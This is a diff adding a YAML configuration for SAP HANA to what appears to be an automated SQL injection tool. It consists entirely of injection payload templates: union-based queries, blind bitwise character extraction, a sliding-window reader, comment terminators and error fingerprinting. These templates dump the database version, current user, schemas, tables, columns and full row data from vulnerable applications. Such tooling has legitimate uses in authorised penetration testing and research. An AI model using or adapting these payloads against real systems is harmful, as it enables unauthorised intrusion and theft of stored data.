@@ -1,0 +1,158 @@
+engine: Hana
+
+resource:
+ info: |
+  select
+      '${enclose_value_sql}'
+      || version
+      || '${enclose_value_sql}'
+      || database_name
+      || '${enclose_value_sql}'
+      || current_user
+      || '${trail_sql}'
+  from sys.m_database
+
+ schema:
+  database: |
+   select
+       string_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+           order by r
+       )
+       || '${trail_sql}'
+   from (
+       select schema_name r
+       from sys.schemas
+       order by r
+       ${limit}
+   )
+
+  table: |
+   select
+       string_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+           order by r
+       )
+       || '${trail_sql}'
+   from (
+       select distinct name r
+       from sys.rs_tables_ t
+       where t.schema = '${database}'
+       union
+       select distinct name r
+       from sys.rs_views_ v
+       where v.schema = '${database}'
+       order by r
+       ${limit}
+   )
+
+  column: |
+   select
+       string_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+           order by r
+       )
+       || '${trail_sql}'
+   from (
+       select distinct c.name r
+       from sys.rs_columns_ c
+       inner join sys.rs_tables_ t on c.cid = t.oid
+       where t.schema = '${database}' and t.name = '${table}'
+       union
+       select distinct c1.name r
+       from sys.rs_columns_ c1
+       inner join sys.rs_views_ v on c1.cid = v.oid
+       where v.schema = '${database}' and v.name = '${table}'
+       order by r
+       ${limit}
+   )
+
+  row:
+   query: |
+    select
+        string_agg(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || '0'
+            || '${enclose_value_sql}',
+            '${separator_cell_sql}'
+            order by r
+        )
+        || '${trail_sql}'
+    from (
+        select distinct (${fields})r
+        from ${database}.${table}
+        order by r
+        ${limit}
+    )
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
+        */
+       '${lead}'
+       || nullif (
+           substr (
+               (${injection}),
+               ${window.char},
+               65536
+           ),
+           '${trail_sql}'
+       )
+   from dummy
+  limit: limit 65536 offset ${limit.value}
+  failsafe: cast((1337${indice}7330%2b1) as varchar)
+  calibrator: rpad('${calibrator_sql}', 1024, '${calibrator_sql}')
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Hana database
+
+ union:
+  indices: union select ${indices} from dummy
+  capacity: ('${lead}'|| ${indice}|| ${calibrator})
+  orderBy: order by 1337
+
+ binary:
+  test:
+   bit: |
+    /**
+     * true bit return bit, false bit return 0
+     * 8 & 8 = 8, 8 & 4 = 0
+     */
+    0 != bitand(
+        ascii(
+            substr(
+                (${injection}),
+                ${window.char},
+                1
+            )
+        ),
+        ${bit}
+    )
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
